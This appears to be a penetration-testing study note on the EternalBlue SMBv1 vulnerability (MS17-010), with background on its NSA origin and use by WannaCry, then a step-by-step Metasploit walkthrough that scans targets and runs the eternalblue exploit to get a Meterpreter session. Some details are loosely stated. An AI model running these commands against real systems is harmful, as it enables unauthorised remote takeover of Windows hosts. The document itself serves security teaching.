## Eternal Blue
* It is the name given to MS 17-010/CVE-2017-0144
* A collection  of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access.
* Developed by NSA to take advantage of this vulnerability, but was leaked to public by a hacker group called Shadow Brokers in 2017.
* **Waht does it take advantage of ?**
  * A vulnerability in the Windows SMBv1 protocol
 
### Wanna Cry ransomware
* The Eternal Blue exploit was used in the Wanna Cry ransomware attack
* It affects the following versions:
    1. Windows Vista
    2. Windows 7
    3. Windows Server 2008
    4. Windows 8.1
    5. Windows Server 2012
    6. Windows 10
    7. Windows Server 2016
 
* The Eternal Blue exploit has a MSF auxiliary module which provides with a privileged meterpreter session.

* PRACTICAL
* `msfconsole`
* `workspace -a [name]`
* `db_nmap -sS -sV -o [IP]`
* `services` --> This is the advantage of doing work inside of a workspace
* `search type:auxiliary name:Eternal Blue`
* `use auxiliary/scanner/smb/smb_ms17_010`
* `set rhosts [IP]`
* It can also be run on the whole subnet which can be provided in the last command which will help in vulnerability scanning for all the systems in the network.
* `run` --> If YES, vulnerable, go to the next step:
* `use exploit/windows/smb/ms17_010_eternalblue`
* `set rhosts [IP]`
* `run` --> Should provide a meterpreter session on  the target system
